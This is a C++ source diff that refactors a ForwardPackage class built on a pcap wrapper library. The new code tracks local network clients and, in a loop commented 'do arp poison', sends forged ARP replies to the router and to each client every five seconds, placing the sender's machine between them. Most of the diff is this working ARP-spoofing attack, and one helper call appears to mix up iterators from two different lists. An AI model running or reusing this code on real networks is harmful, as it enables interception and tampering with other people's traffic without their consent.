@@ -1,7 +1,7 @@
 #include "forwardpackage.h"
 
 #include <iostream>
-#include <string.h>
+#include <algorithm>
 
 #include <pcapwrapper/controller.hpp>
 #include <pcapwrapper/interfaces/interface.h>
@@ -9,6 +9,12 @@
 #include <pcapwrapper/network/packages/arppackage.h>
 #include <pcapwrapper/network/builders/builder.h>
 #include <pcapwrapper/network/builders/keys.h>
+
+template <typename IT, typename V>
+bool exists(IT begin, IT end, const V &v) {
+    auto it = std::find(begin, end, v);
+    return !(it == end);
+}
 
 ForwardPackage::ForwardPackage(PCAP::IpAddress local_ip,
                    PCAP::MacAddress local_mac,
@@ -20,95 +26,106 @@ ForwardPackage::ForwardPackage(PCAP::IpAddress local_ip,
     , m_router_ip{router_ip}
     , m_router_mac{router_mac}
     , m_interface_name{interface_name}
+    , m_stop{false}
 {
-
+    m_new_clients.reserve(10);
+    m_existing_clients.reserve(10);
+    m_future_clients = std::async(std::launch::async, &ForwardPackage::clients_receivers, this);
+    m_future_working = std::async(std::launch::async, &ForwardPackage::working_function, this);
 }
 
-auto ForwardPackage::get_flags(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
-    return std::find_if(std::begin(m_flags), std::end(m_flags),
-                        [&target_ip, &target_mac](auto& flag){ return flag.m_target_ip == target_ip && flag.m_target_mac == target_mac;});
-}
+void ForwardPackage::new_client(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
+    // receive arp replies from clients
+    std::lock_guard<std::mutex> lock(m_mutex);
+    auto it = std::find_if(m_new_clients.begin(), m_new_clients.end(), [&target_ip, &target_mac](auto &a)
+                            {return target_ip == a.m_ip && target_mac == a.m_mac; });
+    if (it == m_new_clients.end()) {
 
-void ForwardPackage::newClient(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
-    auto it = std::find_if(m_packages.begin(), m_packages.end(), [&target_mac, &target_ip](auto& a)
-                           {  return std::get<1>(a) == target_mac && std::get<0>(a) == target_ip; });
-    if (it == m_packages.end()) {
-        std::lock_guard<std::mutex> m_lock(m_mutex);
-        std::cout << "Starting new thread " << target_ip.to_string() << " " << target_mac.to_string() << std::endl;
-        m_packages.emplace_back(std::make_tuple(target_ip, target_mac));
-        m_flags.emplace_back(target_ip, target_mac);
-        m_threads.emplace_back(std::make_unique<std::thread>(&ForwardPackage::workingFunction, this, target_ip, target_mac));
+        m_new_clients.emplace_back(NetworkClient(target_ip, target_mac));
     }
 }
 
-void ForwardPackage::stopClient(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
-    auto it = get_flags(target_ip, target_mac);
-    if (it != std::end(m_flags)) {
-        it->m_stop = true;
-    } else {
-        std::cout << "Package doesn't exist in flags" << std::endl;
-    }
+void ForwardPackage::clients_receivers() {
+    // every 20 seconds if there are new clients or clients didn't reply
+    while (!m_stop) {
+        if (m_stop) return;
+        {
+            std::lock_guard<std::mutex> lock(m_mutex);
+            // stop threads for clients that didn't reply.
+            for_each(m_existing_clients.begin(), m_existing_clients.end(), [this](auto &client){
+                if (!exists(m_new_clients.begin(), m_existing_clients.end(), client)) {
+                    //std::cout << "Stoping thread: " << client.m_ip << " " << client.m_mac << std::endl;
+                    //client.m_running = false;
+                }
+            });
+            // start new threads for new clients.
+            for_each(m_new_clients.begin(), m_new_clients.end(), [this](auto &client){
+                if (!exists(m_existing_clients.begin(), m_existing_clients.end(), client)) {
+                    std::cout << "Starting thread: " << client.m_ip << " " << client.m_mac << std::endl;
+                    m_existing_clients.push_back(client);
+                }
+            });
+            // clear new_clients to start again
+            m_new_clients.clear();
+        }
 
-    std::cout << "Stoping a thread " << target_ip.to_string() << " " << target_mac.to_string() << std::endl;
-    {
-        std::lock_guard<std::mutex> m_lock(m_mutex);
-        m_packages.erase(std::remove_if(m_packages.begin(), m_packages.end(), [&target_ip, &target_mac](auto& p){
-            return target_ip == std::get<0>(p) && target_mac == std::get<1>(p);
-        }), m_packages.end());
-        m_flags.erase(std::remove_if(m_flags.begin(), m_flags.end(),[&target_ip, &target_mac](auto& f){
-            return target_ip == f.m_target_ip && target_mac == f.m_target_mac;
-        }), m_flags.end());
+        // sleep, for other clients to reply
+        using namespace std::chrono_literals;
+        std::this_thread::sleep_for(20s);
     }
 }
 
 void ForwardPackage::stop() {
+    // stop for checking for other threads
+    m_stop = true;
     {
-        std::lock_guard<std::mutex> m_lock(m_mutex);
-        for( auto& f : m_flags) {
-            f.m_stop = true;
-        }
-    }
-    for (auto& t : m_threads) {
-        t->join();
+        // stop all
+        m_future_clients.get();
+        std::lock_guard<std::mutex> lock(m_mutex);
+        for_each(m_existing_clients.begin(), m_existing_clients.end(), [this](auto &client) {
+            client.m_running = false;
+        });
+        m_future_working.get();
     }
 }
 
-bool ForwardPackage::is_stop(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
-    std::lock_guard<std::mutex> m_lock(m_mutex);
-    auto it = get_flags(target_ip, target_mac);
-    if (it != std::end(m_flags)) {
-        return it->m_stop;
-    }
-    return true;
-}
-
-void ForwardPackage::workingFunction(PCAP::IpAddress target_ip, PCAP::MacAddress target_mac) {
+void ForwardPackage::working_function() {
     auto controller = PCAP::Controller<PCAP::Interface, PCAP::Processor>::getController(m_interface_name);
 
-    while (!is_stop(target_ip, target_mac)) {
+    while (!m_stop) {
+        {
+            // do arp poison
+            std::lock_guard<std::mutex> lock(m_mutex);
+            for (auto &client : m_existing_clients) {
+                using namespace PCAP::PCAPBuilder;
+                auto package_router = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
+                                                                {Keys::Key_Eth_Mac_Src, Option{m_local_mac}},
+                                                                {Keys::Key_Eth_Mac_Dst, Option{m_router_mac}},
+                                                                {Keys::Key_Arp_Mac_Src, Option{m_local_mac}},
+                                                                {Keys::Key_Arp_Mac_Dst, Option{m_router_mac}},
+                                                                {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
+                                                                {Keys::Key_Ip_Src, Option{client.m_ip}},
+                                                                {Keys::Key_Ip_Dst, Option{m_router_ip}}});
+                controller->write(package_router.getPackage(), 60);
 
-        using namespace PCAP::PCAPBuilder;
-        auto package_router = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
-                                                        {Keys::Key_Eth_Mac_Src, Option{m_local_mac}},
-                                                        {Keys::Key_Eth_Mac_Dst, Option{m_router_mac}},
-                                                        {Keys::Key_Arp_Mac_Src, Option{m_local_mac}},
-                                                        {Keys::Key_Arp_Mac_Dst, Option{m_router_mac}},
-                                                        {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
-                                                        {Keys::Key_Ip_Src, Option{target_ip}},
-                                                        {Keys::Key_Ip_Dst, Option{m_router_ip}}});
-        controller->write(package_router.getPackage(), 60);
+                auto package_target = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
+                                                                {Keys::Key_Eth_Mac_Src, Option{m_local_mac}},
+                                                                {Keys::Key_Eth_Mac_Dst, Option{client.m_mac}},
+                                                                {Keys::Key_Arp_Mac_Src, Option{m_local_mac}},
+                                                                {Keys::Key_Arp_Mac_Dst, Option{client.m_mac}},
+                                                                {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
+                                                                {Keys::Key_Ip_Src, Option{m_router_ip}},
+                                                                {Keys::Key_Ip_Dst, Option{client.m_ip}}});
+                controller->write(package_target.getPackage(), 60);
+            }
 
-        auto package_target = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
-                                                        {Keys::Key_Eth_Mac_Src, Option{m_local_mac}},
-                                                        {Keys::Key_Eth_Mac_Dst, Option{target_mac}},
-                                                        {Keys::Key_Arp_Mac_Src, Option{m_local_mac}},
-                                                        {Keys::Key_Arp_Mac_Dst, Option{target_mac}},
-                                                        {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
-                                                        {Keys::Key_Ip_Src, Option{m_router_ip}},
-                                                        {Keys::Key_Ip_Dst, Option{target_ip}}});
-        controller->write(package_target.getPackage(), 60);
+            // remove clients that didn't reply
+            m_existing_clients.erase(std::remove_if(m_existing_clients.begin(), m_existing_clients.end(), [](auto &client){
+                return !client.m_running;
+            }),m_existing_clients.end());
+        }
 
         using namespace std::chrono_literals;
-        std::this_thread::sleep_for(2s);
+        std::this_thread::sleep_for(5s);
     }
 }
